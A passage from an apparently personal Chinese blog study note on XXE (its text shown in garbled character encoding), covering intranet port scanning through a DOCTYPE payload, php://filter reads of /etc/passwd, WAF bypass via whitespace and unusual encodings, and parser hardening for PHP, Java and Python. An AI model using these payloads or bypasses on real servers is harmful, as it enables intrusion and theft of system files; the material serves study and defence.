<p>è¦è¿›è¡Œå†…ç½‘æ¢æµ‹æˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ file åè®®è¯»å–æˆ‘ä»¬ä½œä¸ºæ”¯ç‚¹æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å†…ç½‘ï¼Œä»¥åŠç½‘æ®µå¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å– &#x2F;etc&#x2F;network&#x2F;interfaces æˆ–è€… &#x2F;proc&#x2F;net&#x2F;arp æˆ–è€… &#x2F;etc&#x2F;host æ–‡ä»¶</p>
</blockquote>
<h3 id="HTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"><a href="#HTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"></a><strong>HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ</strong></h3><p>åˆ©ç”¨burpsuiteè¾…åŠ©</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:ç«¯å£å·/&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>ç«¯å£å·éƒ¨åˆ†ç”¨bpçˆ†ç ´</p>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æœ‰èƒ½åŠ›å¯¹æ•´ä¸ªç½‘æ®µè¿›è¡Œäº†ä¸€ä¸ªå…¨é¢çš„æ¢æµ‹,å¹¶èƒ½å¾—åˆ°å†…ç½‘æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯äº†ï¼Œå¦‚æœå†…ç½‘çš„æœåŠ¡å™¨æœ‰æ¼æ´ï¼Œå¹¶ä¸”æ°å¥½åˆ©ç”¨æ–¹å¼åœ¨æœåŠ¡å™¨æ”¯æŒçš„åè®®çš„èŒƒå›´å†…çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨ XXE æ‰“å‡»å†…ç½‘æœåŠ¡å™¨ç”šè‡³èƒ½ç›´æ¥ getshellï¼ˆæ¯”å¦‚æœ‰äº› å†…ç½‘çš„æœªæˆæƒ redis æˆ–è€…æœ‰äº›é€šè¿‡ http get è¯·æ±‚å°±èƒ½ç›´æ¥getshell çš„ æ¯”å¦‚ strus2ï¼‰</p>
</blockquote>
<h3 id="å†…ç½‘ç›²æ³¨"><a href="#å†…ç½‘ç›²æ³¨" class="headerlink" title="å†…ç½‘ç›²æ³¨"></a>å†…ç½‘ç›²æ³¨</h3><blockquote>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ libxml è¯»å–æ–‡ä»¶å†…å®¹çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¸èƒ½è¿‡å¤§ï¼Œå¦‚æœå¤ªå¤§å°±ä¼šæŠ¥é”™ï¼Œäºæ˜¯æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ php<br>è¿‡æ»¤å™¨çš„ä¸€ä¸ªå‹ç¼©çš„æ–¹æ³•</p>
<p>å‹ç¼©ï¼šecho file_get_contents(â€œphp:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwdâ€);<br>è§£å‹ï¼šecho file_get_contents(â€œphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;zlib.inflate&#x2F;resource&#x3D;&#x2F;tmp&#x2F;1â€);</p>
</blockquote>
<p>æˆ‘ä»¬è€ƒè™‘å†…ç½‘æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œæˆ‘ä»¬è¯»å–</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br><span class="line">/etc/host</span><br></pre></td></tr></table></figure></div>

<h3 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h3><h4 id="é’ˆå¯¹çš„WAF"><a href="#é’ˆå¯¹çš„WAF" class="headerlink" title="é’ˆå¯¹çš„WAF"></a>é’ˆå¯¹çš„WAF</h4><p>1.æˆç†Ÿçš„wafâ€”â€”ä½¿ç”¨è‡ªå·±çš„è§£æå™¨é¢„å¤„ç†XMLæ–‡æ¡£çš„WAFsã€‚<br>2.åŸºäºæ­£åˆ™è¡¨è¾¾å¼ã€‚ä»…æœç´¢æ•°æ®ä¸­çš„ç‰¹å®šå­å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼çš„WAFSã€‚</p>
<h4 id="é¢å¤–ç©ºæ ¼"><a href="#é¢å¤–ç©ºæ ¼" class="headerlink" title="é¢å¤–ç©ºæ ¼"></a>é¢å¤–ç©ºæ ¼</h4><p>ç”±äºXXEé€šå¸¸åœ¨XMLæ–‡æ¡£çš„å¼€å¤´ï¼Œæ‰€ä»¥æ¯”è¾ƒçœäº‹å„¿çš„WAFå¯ä»¥é¿å…å¤„ç†æ•´ä¸ªæ–‡æ¡£ï¼Œè€Œåªè§£æå®ƒçš„å¼€å¤´ã€‚ä½†æ˜¯ï¼ŒXMLæ ¼å¼å…è®¸åœ¨æ ¼å¼åŒ–æ ‡è®°å±æ€§æ—¶ä½¿ç”¨<u>ä»»æ„æ•°é‡çš„ç©ºæ ¼</u>ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨<code>&lt;?xml?&gt;</code>æˆ–<code>&lt;!DOCTYPE&gt;</code>ä¸­æ’å…¥é¢å¤–çš„ç©ºæ ¼ï¼Œä»è€Œç»•è¿‡æ­¤ç±»WAFã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003137.jpg"
                      alt="image-20220501154908744"
                ></p>
<h4 id="æ ¼å¼æ— æ•ˆ-é“¾æ¥åˆ°æœªçŸ¥å®ä½“"><a href="#æ ¼å¼æ— æ•ˆ-é“¾æ¥åˆ°æœªçŸ¥å®ä½“" class="headerlink" title="æ ¼å¼æ— æ•ˆ(é“¾æ¥åˆ°æœªçŸ¥å®ä½“)"></a>æ ¼å¼æ— æ•ˆ(é“¾æ¥åˆ°æœªçŸ¥å®ä½“)</h4><p>ä¸ºäº†å®‰å…¨èµ·è§ï¼Œä¸€äº›WAFé€šå¸¸ä¸ä¼šè¯»å–é“¾æ¥æ–‡ä»¶çš„å†…å®¹ï¼Œä½†å¤–éƒ¨èµ„æºé“¾æ¥è¿˜å¯ä»¥å­˜åœ¨äºå£°æ˜&lt;!DOCTYPE&gt;ä¸­ã€‚è¿™æ„å‘³ç€æœªè¯»å–æ–‡ä»¶å†…å®¹çš„WAFå°†ä¸ä¼šè¯»å–æ–‡æ¡£ä¸­å®ä½“çš„å£°æ˜,è¿™æ ·åœ¨åç»­æ­£æ–‡ä¸­ä½¿ç”¨å¤–éƒ¨é“¾æ¥ä¸­çš„å®ä½“ï¼Œå°±ä¼šè¢«wafçš„xmlè§£æå™¨è®¤ä¸ºæ˜¯æœªçŸ¥å®ä½“ï¼Œå¯¼è‡´é”™è¯¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003001.jpg"
                      alt="image-20220501155941595"
                ></p>
<h4 id="ç½•è§ç¼–ç "><a href="#ç½•è§ç¼–ç " class="headerlink" title="ç½•è§ç¼–ç "></a>ç½•è§ç¼–ç </h4><p>ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚</p>
<blockquote>
<p>æ”¹å˜ç¼–ç å¯ä»¥åˆ©ç”¨vscodeçš„æŒ‰å…¶ä»–ç¼–ç ä¿å­˜</p>
</blockquote>
<p>ä¾‹é¢˜ï¼š[CSAWQual 2019]Web_Unagi</p>
<h4 id="åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç "><a href="#åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç " class="headerlink" title="åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç "></a>åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç </h4><p>å½“åŒ…å«ç¼–ç å±æ€§çš„<?xml?>æ ‡è®°å¼•ç”¨ä¸æ–‡æ¡£é¦–å­—èŠ‚å†³å®šçš„å­—ç¬¦é›†ä¸åŒæ—¶ï¼Œä¸€äº›è§£æå™¨æ›´æ”¹ç¼–ç ï¼Œä½¿æ–‡ä»¶çš„å¼€å¤´æœ‰ä¸€ç»„å­—ç¬¦ï¼Œå…¶ä½™çš„æ˜¯å¦ä¸€ç»„ç¼–ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒçš„è§£æå™¨å¯èƒ½åœ¨ä¸åŒçš„æ—¶é—´è½¬æ¢ç¼–ç ã€‚Javaè§£æå™¨(javax.xml.parsers)åœ¨<?xml?>ç»“æŸåä¸¥æ ¼åœ°æ›´æ”¹å­—ç¬¦é›†ï¼Œè€Œlibxml2è§£æå™¨å¯ä»¥åœ¨æ‰§è¡Œâ€œç¼–ç â€å±æ€§çš„å€¼ä¹‹åæˆ–åœ¨å¤„ç†<?xml?>ä¹‹å‰æˆ–ä¹‹ååˆ‡æ¢ç¼–ç ã€‚<br>åªæœ‰åœ¨æ ¹æœ¬ä¸å¤„ç†è¿™äº›æ–‡ä»¶æ—¶ï¼Œæ¯”è¾ƒæˆç†Ÿçš„WAFæ‰èƒ½å¯é åœ°é˜²æ­¢è¿™äº›æ–‡ä»¶ä¸­çš„æ”»å‡»ã€‚æˆ‘ä»¬è¿˜å¿…é¡»è®°ä½ï¼Œæœ‰è®¸å¤šåŒä¹‰è¯ç¼–ç ï¼Œä¾‹å¦‚UTF-32BEå’ŒUCS-4BEã€‚æ­¤å¤–ï¼Œæœ‰äº›ç¼–ç å¯èƒ½ä¸åŒï¼Œä½†ä»ç¼–ç æ–‡æ¡£åˆå§‹éƒ¨åˆ†â€Š<code>&lt;?xml?&gt;</code>çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒä»¬æ˜¯å…¼å®¹çš„ã€‚ä¾‹å¦‚ï¼Œçœ‹ä¼¼UTF-8çš„æ–‡æ¡£å¯èƒ½åŒ…å«å­—ç¬¦ä¸²<code>&lt;?xml version=â€1.0â€ encoding=â€windows-1251â€?&gt;</code>ã€‚<br>è¿™é‡Œæœ‰ä¸€äº›ä¾‹å­ã€‚ä¸ºäº†ç®€æ˜æ‰¼è¦ï¼Œæˆ‘ä»¬ä¸æŠŠXXEæ”¾åœ¨æ–‡æ¡£é‡Œã€‚<br>libxml2è§£æå™¨å°†æ–‡æ¡£è§†ä¸ºæœ‰æ•ˆï¼Œä½†æ˜¯ï¼Œjavax.xml.parsers setä¸­çš„Javaå¼•æ“è®¤ä¸ºå®ƒæ— æ•ˆï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407040003488.jpg"
                      alt="image-20220501161313385"
                ></p>
<blockquote>
<p>æ§åˆ¶æ–‡æ¡£çš„ç¼–ç ï¼ˆä¾‹å¦‚<?xml?>ï¼‰â€”â€”æ–‡æ¡£çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¸¦æœ‰å¯é€‰çš„BOM(å­—èŠ‚é¡ºåºæ ‡è®°)ã€‚</p>
</blockquote>
<h2 id="XXEé˜²å¾¡"><a href="#XXEé˜²å¾¡" class="headerlink" title="XXEé˜²å¾¡"></a>XXEé˜²å¾¡</h2><h3 id="æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><a href="#æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•" class="headerlink" title="æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"></a><strong>æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</strong></h3><p><strong>PHPï¼š</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure></div>

<p><strong>JAVA:</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure></div>

<p>java:<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10774#toc-11" >https://xz.aliyun.com/t/10774#toc-11 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-20" >https://xz.aliyun.com/t/3357#toc-20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>Pythonï¼š</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxe</span>():</span><br><span class="line">    tree = etree.parse(<span class="string">&#x27;xml.xml&#x27;</span>, etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br><span class="line">    <span class="comment"># tree = lxml.objectify.parse(&#x27;xml.xml&#x27;, etree.XMLParser(resolve_entities=False))</span></span><br><span class="line">    <span class="keyword">return</span> etree.tostring(tree.getroot())</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>å°è¯•æ”¹ç”¨defusedxml æ˜¯ä¸€ä¸ªçº¯ Python è½¯ä»¶åŒ…ï¼Œå®ƒä¿®æ”¹äº†æ‰€æœ‰æ ‡å‡†åº“ XML è§£æå™¨çš„å­ç±»ï¼Œå¯ä»¥é˜²æ­¢ä»»ä½•æ½œåœ¨çš„æ¶æ„æ“ä½œã€‚ å¯¹äºè§£æä¸å—ä¿¡ä»»çš„XMLæ•°æ®çš„ä»»ä½•æœåŠ¡å™¨ä»£ç ï¼Œå»ºè®®ä½¿ç”¨æ­¤ç¨‹åºåŒ…ã€‚</p>
</blockquote>
<h3 id="æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤-ä¸æ¨è"><a href="#æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤-ä¸æ¨è" class="headerlink" title="æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æ¨è)"></a><strong>æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æ¨è)</strong></h3><p>è¿‡æ»¤å…³é”®è¯ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPEã€&lt;!ENTITY SYSTEMã€PUBLIC</span><br></pre></td></tr></table></figure></div>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>æ ‡é¢˜:</strong> XXEå­¦ä¹ </li>
        <li><strong>ä½œè€…:</strong> Sl0th</li>
        <li><strong>åˆ›å»ºäº
                :</strong> 2022-04-22 00:02:32</li>
        
            <li>
                <strong>æ›´æ–°äº
                    :</strong> 2024-07-04 00:12:41
            </li>
        
        <li>
            <strong>é“¾æ¥:</strong> http://sl0th.top/2022/04/22/XXEå­¦ä¹ /
        </li>
        <li>
            <strong>
                ç‰ˆæƒå£°æ˜:
            </strong>
            

            
                æœ¬æ–‡ç« é‡‡ç”¨ <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> è¿›è¡Œè®¸å¯ã€‚
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/xxe/">#xxe</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/web/">#web</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2022/05/14/XSS%E5%AD%A6%E4%B9%A0/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">XSSå­¦ä¹ </span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">DTDå­¦ä¹ </span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        è¯„è®º
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          reaction: false,
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">ç›®å½•</div>
        <div class="page-title">XXEå­¦ä¹ </div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">å‰ç½®çŸ¥è¯†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML%E8%AF%AD%E8%A8%80"><span class="nav-text">XMLè¯­è¨€</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML-DTD"><span class="nav-text">XML DTD</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">åˆ©ç”¨æ–¹å¼</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-text">ç›¸å…³å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libxml%E9%80%89%E9%A1%B9%E5%B8%B8%E9%87%8F"><span class="nav-text">libxmlé€‰é¡¹å¸¸é‡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8file%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="nav-text">åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="nav-text">phpä¼ªåè®®è¯»å–æºç </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%9B%9E%E6%98%BE%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AF"><span class="nav-text">ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E8%BE%93%E5%87%BA"><span class="nav-text">æŠ¥é”™è¾“å‡º</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDos"><span class="nav-text">DDos</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">HTTP å†…ç½‘ä¸»æœºæ¢æµ‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%9B%B2%E6%B3%A8"><span class="nav-text">å†…ç½‘ç›²æ³¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="nav-text">WAFç»•è¿‡</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE%E9%98%B2%E5%BE%A1"><span class="nav-text">XXEé˜²å¾¡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%8E%A8%E8%8D%90%E7%9A%84%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E6%89%8B%E5%8A%A8%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4-%E4%B8%8D%E6%8E%A8%E8%8D%90"><span class="nav-text">æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æ¨è)</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        å…±æ’°å†™äº† 44 ç¯‡æ–‡ç« 
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">è®¿é—®äººæ•°</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">æ€»è®¿é—®é‡</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">ç”± <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> é©±åŠ¨</span>
            <span class="text-sm lg:block">ä¸»é¢˜&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
        </div>
        
        
            <div>
                åšå®¢å·²è¿è¡Œ <span class="odometer" id="runtime_days" ></span> å¤© <span class="odometer" id="runtime_hours"></span> å°æ—¶ <span class="odometer" id="runtime_minutes"></span> åˆ†é’Ÿ <span class="odometer" id="runtime_seconds"></span> ç§’
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

